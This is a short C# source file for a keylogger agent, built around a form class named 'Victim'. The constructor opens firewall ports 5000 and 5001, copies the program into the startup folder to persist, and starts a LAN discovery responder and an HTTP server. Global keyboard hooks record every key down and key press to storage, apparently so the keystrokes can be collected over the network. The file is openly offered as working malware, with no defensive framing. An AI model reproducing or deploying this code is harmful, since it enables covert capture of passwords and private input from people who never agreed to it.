using Gma.System.MouseKeyHook;

namespace Local_Keylogger_Agent
{
    public partial class Victim : Form
    {
        private IKeyboardMouseEvents globalHook;

        public Victim()
        {
            InitializeComponent();

            Storage storage = new Storage();

            FirewallHelper.EnsureUdpPort("Agent Discovery UDP 5001", 5001, "Allow discovery UDP 5001 from LAN");
            FirewallHelper.EnsureTcpPort("Agent HTTP TCP 5000", 5000, "Allow HTTP TCP 5000 from LAN");

            SelfCopy selfCopy = new SelfCopy();
            selfCopy.CopySelfToStartup();



            SubscribeGlobal();

            // Start the discovery responder
            DiscoveryResponder discoveryResponder = new DiscoveryResponder();
            discoveryResponder.StartDiscoveryResponder();
            // Start the HTTP server
            HTTPServer HTTPServer = new HTTPServer();
            HTTPServer.StartHTTPServer();
        }

        // Subscribe to all global events
        private void SubscribeGlobal()
        {
            globalHook = Hook.GlobalEvents();

            globalHook.KeyDown += GlobalHook_KeyDown;
            globalHook.KeyPress += GlobalHook_KeyPress;
        }

        private void GlobalHook_KeyDown(object sender, KeyEventArgs e)
        {
            Storage.SaveAnyKeyLog(e.KeyCode.ToString());
        }
        private void GlobalHook_KeyPress(object sender, KeyPressEventArgs e)
        {
            Storage.SaveOnlyKeyPressLog(e.KeyChar.ToString());
        }
    }
}
